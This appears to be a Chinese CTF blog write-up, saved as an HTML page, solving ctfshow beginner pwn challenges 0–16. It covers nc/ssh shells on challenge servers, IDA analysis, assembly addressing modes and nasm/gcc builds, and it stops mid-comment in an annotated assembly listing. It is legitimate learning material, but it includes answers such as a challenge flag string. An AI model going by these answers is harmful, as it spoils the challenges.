@@ -1,0 +1,435 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>pwn0-34 | zx's Blog</title><meta name="author" content="zx"><meta name="copyright" content="zx"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="pwn0使用ssh连接上即可获得flag，在一大段ai的臆想之后，终于可以使用ssh执行命令了，flag在根目录的ctfshow_flag里面 pwn1跟题意说的一样，使用nc连接上之后就可以直接获取flag， 使用ida反编译附件可以发现，其实就是在连接到nc之后这个程序就自动执行了cat flag的操作  pwn2依旧是同样的操作，使用nc连接上之后，执行命令获取flag 可以看system启">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwn0-34">
+<meta property="og:url" content="http://example.com/2024/06/28/pwn0-34/index.html">
+<meta property="og:site_name" content="zx&#39;s Blog">
+<meta property="og:description" content="pwn0使用ssh连接上即可获得flag，在一大段ai的臆想之后，终于可以使用ssh执行命令了，flag在根目录的ctfshow_flag里面 pwn1跟题意说的一样，使用nc连接上之后就可以直接获取flag， 使用ida反编译附件可以发现，其实就是在连接到nc之后这个程序就自动执行了cat flag的操作  pwn2依旧是同样的操作，使用nc连接上之后，执行命令获取flag 可以看system启">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/3.jpg">
+<meta property="article:published_time" content="2024-06-28T13:32:57.000Z">
+<meta property="article:modified_time" content="2024-06-28T14:13:22.159Z">
+<meta property="article:author" content="zx">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="ctfshow">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/3.jpg"><link rel="shortcut icon" href="/img/3.jpg"><link rel="canonical" href="http://example.com/2024/06/28/pwn0-34/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'pwn0-34',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-06-28 22:13:22'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.0.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/3.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">10</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">11</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/2.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="zx's Blog"><span class="site-name">zx's Blog</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">pwn0-34</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-06-28T13:32:57.000Z" title="发表于 2024-06-28 21:32:57">2024-06-28</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-06-28T14:13:22.159Z" title="更新于 2024-06-28 22:13:22">2024-06-28</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/pwn/">pwn</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="pwn0-34"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h4 id="pwn0"><a href="#pwn0" class="headerlink" title="pwn0"></a>pwn0</h4><p>使用ssh连接上即可获得flag，在一大段ai的臆想之后，终于可以使用ssh执行命令了，flag在根目录的ctfshow_flag里面</p>
+<h4 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h4><p>跟题意说的一样，使用nc连接上之后就可以直接获取flag，</p>
+<p>使用ida反编译附件可以发现，其实就是在连接到nc之后这个程序就自动执行了cat flag的操作</p>
+<p><img src="/2024/06/28/pwn0-34/image-20240622221152326.png" alt="image-20240622221152326"></p>
+<h4 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h4><p>依旧是同样的操作，使用nc连接上之后，执行命令获取flag</p>
+<p>可以看system启动了&#x2F;bin&#x2F;sh</p>
+<p><img src="/2024/06/28/pwn0-34/image-20240622221241930.png" alt="image-20240622221241930"></p>
+<p>就是启动了一个交互式的命令行，通过nc连接之后可以远程执行命令</p>
+<h4 id="pwn3"><a href="#pwn3" class="headerlink" title="pwn3"></a>pwn3</h4><p>依旧是使用ida分析一下</p>
+<p><img src="/2024/06/28/pwn0-34/image-20240622222413251.png" alt="image-20240622222413251"></p>
+<p>其实就是一个简单的switch来决定要运行哪个函数，其实靠蒙也能蒙出来（其实看也能看出来），但是我们可以发现，选项4和选项6都是调用的一个函数，跟进后可以发现</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ctfshow():</span><br><span class="line">int ctfshow()</span><br><span class="line">&#123;</span><br><span class="line">  return system(&quot;echo /ctfshow_flag&quot;);</span><br><span class="line">&#125;</span><br><span class="line">system_func():</span><br><span class="line">int system_func()</span><br><span class="line">&#123;</span><br><span class="line">  return system(&quot;cat /ctfshow_flag&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>所以正确的选项为选项6</p>
+<h4 id="pwn4"><a href="#pwn4" class="headerlink" title="pwn4"></a>pwn4</h4><p>同上</p>
+<p><img src="/2024/06/28/pwn0-34/image-20240622223348555.png" alt="image-20240622223348555"></p>
+<p>可以看到，strcpy函数将CTFshowPWN复制给了s1，然后如果s1和s2相同的话就执行execve_func()函数，跟进这个函数</p>
+<p><img src="/2024/06/28/pwn0-34/image-20240622223502562.png" alt="image-20240622223502562"></p>
+<p>直接给了shell，所以步骤就是nc连接之后，输入CTFshowPWN，然后就可以执行命令了</p>
+<h4 id="pwn5"><a href="#pwn5" class="headerlink" title="pwn5"></a>pwn5</h4><p><img src="/2024/06/28/pwn0-34/image-20240622230727429.png" alt="image-20240622230727429"></p>
+<p>可以看到只执行了两个函数，sys_write和sys_exit，重点放在sys_write上</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sys_write 是一个系统调用，用于向文件描述符写入数据。</span><br><span class="line">1 是文件描述符，表示标准输出（stdout）。</span><br><span class="line">&amp;dword_80490E8 是要写入的数据的地址。这个地址通常是一个字符串或缓冲区的指针。</span><br><span class="line">0x16u 是要写入的字节数（22 个字节）。</span><br><span class="line">返回值存储在 v0 中，通常表示写入的字节数。</span><br></pre></td></tr></table></figure>
+
+<p>也就是说，在写入地址dword_80490E8的内容之后，它还会通过标准输出输出出来，也就是题目要求的输出，所以关键就在于到底写入了什么内容</p>
+<p><img src="/2024/06/28/pwn0-34/image-20240622233032319.png" alt="image-20240622233032319"></p>
+<p>这个时候可以选中636c6557h，r一下就可以显示为ascii，或者直接a一下，就可以显示出写入的内容</p>
+<p>ps：636c6557h实际上是小端序存储的，所以通过r键还原出来的ascii是逆序的</p>
+<h4 id="pwn6-12"><a href="#pwn6-12" class="headerlink" title="pwn6-12"></a>pwn6-12</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">; 立即寻址方式</span><br><span class="line">    mov eax, 11         ; 将11赋值给eax</span><br><span class="line">    add eax, 114504     ; eax加上114504</span><br><span class="line">    sub eax, 1          ; eax减去1</span><br><span class="line"></span><br><span class="line">; 寄存器寻址方式</span><br><span class="line">    mov ebx, 0x36d      ; 将0x36d赋值给ebx</span><br><span class="line">    mov edx, ebx          ; 将ebx的值赋值给edx</span><br><span class="line"></span><br><span class="line">; 直接寻址方式</span><br><span class="line">    mov ecx, msg      ; 将msg的地址赋值给ecx</span><br><span class="line"></span><br><span class="line">; 寄存器间接寻址方式</span><br><span class="line">    mov esi, msg        ; 将msg的地址赋值给esi</span><br><span class="line">    mov eax, [esi]      ; 将esi所指向的地址的值赋值给eax</span><br><span class="line"></span><br><span class="line">; 寄存器相对寻址方式</span><br><span class="line">    mov ecx, msg        ; 将msg的地址赋值给ecx</span><br><span class="line">    add ecx, 4          ; 将ecx加上4</span><br><span class="line">    mov eax, [ecx]      ; 将ecx所指向的地址的值赋值给eax</span><br><span class="line"></span><br><span class="line">; 基址变址寻址方式</span><br><span class="line">    mov ecx, msg        ; 将msg的地址赋值给ecx</span><br><span class="line">    mov edx, 2          ; 将2赋值给edx</span><br><span class="line">    mov eax, [ecx + edx*2]  ; 将ecx+edx*2所指向的地址的值赋值给eax</span><br><span class="line"></span><br><span class="line">; 相对基址变址寻址方式</span><br><span class="line">    mov ecx, msg        ; 将msg的地址赋值给ecx</span><br><span class="line">    mov edx, 1          ; 将1赋值给edx</span><br><span class="line">    add ecx, 8          ; 将ecx加上8</span><br><span class="line">    mov eax, [ecx + edx*2 - 6]  ; 将ecx+edx*2-6所指向的地址的值赋值给eax</span><br></pre></td></tr></table></figure>
+
+<p>根据asm文件中所给的提示和ida中的内容进行变换可以得到答案</p>
+<h4 id="pwn13"><a href="#pwn13" class="headerlink" title="pwn13"></a>pwn13</h4><p>根据题目所给的c语言代码运行一下即可，或者在linux中使用gcc编译</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gcc &lt;c文件名&gt; -o &lt;生成的可执行文件名&gt;</span><br><span class="line">gcc pwn6.c -o pwn6</span><br><span class="line">./pwn6</span><br></pre></td></tr></table></figure>
+
+<h4 id="pwn14"><a href="#pwn14" class="headerlink" title="pwn14"></a>pwn14</h4><p>根据题目所给的代码，需要在同一目录下新建一个key文件，内容为CTFshow，然后使用gcc编译即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;CTFshow&quot; &gt; key</span><br><span class="line">ls</span><br><span class="line">gcc pwn14.c -o pwn14</span><br><span class="line">./pwn14</span><br></pre></td></tr></table></figure>
+
+<h4 id="pwn15"><a href="#pwn15" class="headerlink" title="pwn15"></a>pwn15</h4><p>编译汇编代码之后可以得到答案<br>但是其实也可以看出来，就是按照53426的顺序输出str，就是ctfshow{@ss3mb1y_1s_3@sy}</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nasm -f elf64 pwn15.asm -o pwn15.o</span><br><span class="line">ld -s -o pwn15 pwn15.o</span><br><span class="line">./pwn15</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nasm -f elf pwn15.asm -o pwn15.o</span><br><span class="line">ld -m elf_i386 -s -o pwn15 pwn15.o</span><br><span class="line">./pwn15</span><br></pre></td></tr></table></figure>
+
+<h5 id="nasm编译"><a href="#nasm编译" class="headerlink" title="nasm编译"></a>nasm编译</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">编译：使用 nasm 将汇编代码编译成 32-bit ELF 格式的目标文件：</span><br><span class="line">nasm -f elf pwn15.asm -o pwn15.o</span><br><span class="line">-f elf：指定输出格式为 ELF (32-bit)。</span><br><span class="line">-o pwn15.o：指定输出目标文件的名称。</span><br><span class="line">链接：使用 ld 将目标文件链接成 32-bit 可执行文件：</span><br><span class="line">ld -m elf_i386 -s -o pwn15 pwn15.o</span><br><span class="line">-m elf_i386：指定目标平台为 32-bit ELF。</span><br><span class="line">-s：去除可执行文件中的符号表，减小文件大小。</span><br><span class="line">-o pwn15：指定输出可执行文件的名称。</span><br><span class="line"></span><br><span class="line">编译：使用 nasm 将汇编代码编译成 64-bit ELF 格式的目标文件：</span><br><span class="line">nasm -f elf64 pwn15.asm -o pwn15.o</span><br><span class="line">-f elf64：指定输出格式为 ELF (64-bit)。</span><br><span class="line">-o pwn15.o：指定输出目标文件的名称。</span><br><span class="line">链接：使用 ld 将目标文件链接成 64-bit 可执行文件：</span><br><span class="line">ld -s -o pwn15 pwn15.o</span><br><span class="line">-s：去除可执行文件中的符号表，减小文件大小。</span><br><span class="line">-o pwn15：指定输出可执行文件的名称。</span><br></pre></td></tr></table></figure>
+
+<h6 id="汇编小知识–linux系统调用"><a href="#汇编小知识–linux系统调用" class="headerlink" title="汇编小知识–linux系统调用"></a>汇编小知识–linux系统调用</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">您可以在汇编程序中使用 Linux 系统调用。您需要采取以下步骤在程序中使用 Linux 系统调用</span><br><span class="line">将系统调用号放入EAX寄存器中。</span><br><span class="line">将系统调用的参数存储在寄存器 EBX、ECX 等中。</span><br><span class="line">调用相关中断（80h）。</span><br><span class="line">结果通常返回在EAX寄存器中。</span><br><span class="line">mov	edx,4		; message length</span><br><span class="line">mov	ecx,msg		; message to write</span><br><span class="line">mov	ebx,1		; file descriptor (stdout)</span><br><span class="line">mov	eax,4		; system call number (sys_write)</span><br><span class="line">int	0x80		; call kernel</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/06/28/pwn0-34/image-20240623140132942.png" alt="image-20240623140132942"></p>
+<h4 id="pwn16"><a href="#pwn16" class="headerlink" title="pwn16"></a>pwn16</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc pwn16.s -o pwn16</span><br><span class="line">./pwn16</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gcc -c pwn16.s -o pwn16.o</span><br><span class="line">gcc pwn16.o -o pwn16</span><br><span class="line">./pwn16</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line">pwn16.s</span><br><span class="line">	.file	&quot;flag.c&quot;  ;指定当前汇编代码所对应的源文件名为 flag.c</span><br><span class="line">	.text			  ;声明接下来的代码将放置在程序的代码段中	</span><br><span class="line">	.section	.rodata ;.section 是汇编语言中的一个指令，用于定义程序的不同段（section）。在汇编语言中，程序的内存布局是以段（section）来划分和管理的，不同的段有不同的作用和权限。.rodata表示只读数据</span><br><span class="line">	</span><br><span class="line">.LC0:   ;在汇编语言中，.LC0 被称为标签（label），它不是一个变量名，而是一个在汇编程序中用来标识内存地址的符号。标签（或标号）在汇编语言中通常用来表示数据或指令的位置，以便程序能够引用和访问这些位置的内容。</span><br><span class="line">	.string	&quot;ctfshow&#123;&quot; ;大概可以理解成声明了一个叫LC0的string类型的变量的地址，地址内的内容为ctfshow&#123;</span><br><span class="line">	.text</span><br><span class="line">	.globl	ctfshow ;globl 是一个汇编指令，用于声明 ctfshow 是一个全局符号（global symbol），即可以被其他文件或模块访问和使用。是一个标签（label），在这里用来表示一个函数的入口点或起始地址</span><br><span class="line">	.type	ctfshow, @function ;type 是一个指令，用于指定符号的类型或属性。ctfshow 是我们之前声明为全局符号的标签名。@function 是 .type 指令的一个属性参数，用于指示 ctfshow 是一个函数。这有助于汇编器和链接器正确处理这个符号，以便在链接时正确处理函数调用。</span><br><span class="line">	</span><br><span class="line">ctfshow:   ;ctfshow 是一个标签（label），表示函数的入口点或起始地址</span><br><span class="line"></span><br><span class="line">.LFB0:	   ;.LFB0 通常是一个局部函数块（Local Function Begin）的标签，用来标识函数的开始</span><br><span class="line">	.cfi_startproc ;在汇编代码中，.cfi_startproc 指令的作用是标记一个新函数的开始点</span><br><span class="line">	pushq	%rbp ;pushq 是将 64 位数据（即寄存器 %rbp 的值）压入栈顶的指令。q 表示操作数的大小为 quad-word，即 64 位，quad-word就是四个字，即八个字节64bit</span><br><span class="line">	.cfi_def_cfa_offset 16 ;在汇编语言中，CFA 是一种虚拟的栈帧地址，用来描述当前函数的栈帧结构。.cfi_def_cfa_offset 指令告诉调试器，在当前函数的栈帧中，CFA 位于栈顶的偏移量是多少。.cfi_def_cfa_offset 指令后面的参数表示 CFA 相对于当前栈顶的偏移量,偏移量为 16，意味着 CFA 的地址可以通过当前栈顶加上 16 来计算得出</span><br><span class="line">	.cfi_offset 6, -16 ;是 GAS（GNU汇编器）中的一条指令，用于定义寄存器的偏移量或保存位置，以便在调试时可以恢复寄存器的值。将 %rbp 寄存器的旧值保存到偏移量为 -16 的位置</span><br><span class="line">	movq	%rsp, %rbp ;将当前栈顶指针 %rsp 的值复制给 %rbp，建立新的栈帧</span><br><span class="line">	.cfi_def_cfa_register 6  ;.cfi_def_cfa_register 6 指示调试器在分析和调试时应将当前栈帧的基址指针设置为 %rbp 寄存器</span><br><span class="line">	subq	$32, %rsp ;将 %rsp 的值减去 32，即将栈指针向下移动 32 字节的位置针设置为 %rbp 寄存器。在 x86-64 架构中，栈是向下生长的，因此减小 %rsp 的值会在栈上分配新的空间</span><br><span class="line">	movq	%rdi, -24(%rbp) ;将 %rdi 寄存器的值存储到当前函数栈帧中相对于 %rbp 的偏移位置 -24 处</span><br><span class="line">	leaq	.LC0(%rip), %rdi ;leaq 是 load effective address 的缩写，用于加载有效地址。leaq .LC0(%rip), %rdi 的效果是将计算得到的 .LC0 的地址（相对于当前指令的 %rip 的偏移量）存储到 %rdi 寄存器中</span><br><span class="line">	movl	$0, %eax ;将立即数 0（常数）加载到 %eax 寄存器中</span><br><span class="line">	call	printf@PLT ;调用 printf 函数。PLT 表示 Procedure Linkage Table，它是用于动态链接共享库（如C库）中函数的一种机制。在程序执行时，call printf@PLT 会执行以下步骤：将当前指令的下一条指令地址（即 call 指令后面的地址）压入栈中，作为 printf 函数执行完毕后的返回地址。跳转到 printf 函数的地址，开始执行 printf 函数内部的代码</span><br><span class="line">	movl	$0, -4(%rbp) ;将 立即数 0（常数）存储到当前函数栈帧中相对于 %rbp 的偏移位置 -4 处</span><br><span class="line">	jmp	.L2  ;跳转到.L2</span><br><span class="line">	</span><br><span class="line">.L3:</span><br><span class="line">	movl	-4(%rbp), %eax ;将存储在 %rbp-4 处的值（即局部变量或参数）加载到 %eax 寄存器中。此时%rbp-4的值为0</span><br><span class="line">	movslq	%eax, %rdx ;将 %eax 寄存器的内容符号扩展（sign extend）到 %rdx 寄存器。这一步通常用于准备地址计算，因为后面可能需要使用 64 位寄存器来计算地址</span><br><span class="line">	movq	-24(%rbp), %rax ;将存储在 %rbp-24 处的值（即局部变量或参数）加载到 %rax 寄存器中。此时%rbp-24的值为%rdi寄存器的值</span><br><span class="line">	addq	%rdx, %rax ;将 %rdx 寄存器的值（即偏移量或索引）加到 %rax 寄存器中，计算出字符串中特定字符的地址</span><br><span class="line">	movzbl	(%rax), %eax ;从 %rax 寄存器指向的地址读取一个字节（8 位），并将其零扩展到 %eax 寄存器，以确保高位清零</span><br><span class="line">	movzbl	%al, %eax ;将 %al 寄存器（低位）的内容零扩展到 %eax 寄存器。这一步操作通常是多余的，因为在前面已经使用了 movzbl (%rax), %eax 指令，它本身已经将 %al 清零扩展到了 %eax</span><br><span class="line">	movl	%eax, %edi ;将 %eax 寄存器的值（即读取到的字符）传递给 %edi 寄存器，作为 putchar 函数的参数</span><br><span class="line">	call	putchar@PLT ;调用putchar函数</span><br><span class="line">	addl	$1, -4(%rbp) ;将 %rbp-4 处的值增加1，即更新循环计数器或字符索引，以便下一次循环迭代</span><br><span class="line">	</span><br><span class="line">.L2:  ;标识.L2代码段</span><br><span class="line">	cmpl	$15, -4(%rbp) ;cmpl 是比较指令，用于比较两个操作数的值。这里将立即数 15 与位于栈帧中 %rbp 寄存器偏移 -4 处的值进行比较。在LC0中-4处的值为0，比较的方式是cmpl y,x，通过x-y的值来决定是1还是0，如果x&lt;=y，就为1，x&gt;y就为0</span><br><span class="line">	jle	.L3 ;jle表示“jump if less than or equal”，这里的0&lt;15，跳转到.L3</span><br><span class="line">	movl	$125, %edi ;将 125传递给 %edi 寄存器，作为 putchar 函数的参数</span><br><span class="line">	call	putchar@PLT ;调用putchar函数</span><br><span class="line">	nop ;在大多数处理器架构中，nop 指令被用作占位符或者是为了在调试过程中插入空操作而存在的。它的执行不会对寄存器或者内存产生任何影响，只是简单地让处理器执行一个空操作，然后继续执行下一条指令。</span><br><span class="line">	leave ;具体来说，leave 指令的执行等效于以下两条指令的组合：movq %rbp, %rsp：将栈顶指针 rsp 设置为栈底指针 rbp 的值，这个操作使得栈指针指向当前函数的栈帧顶部。popq %rbp：出栈操作，将保存在栈底指针 rbp 处的值弹出，并将其赋值给 rbp 寄存器，恢复调用函数的栈帧。</span><br><span class="line">	.cfi_def_cfa 7, 8 ;将 %rsp 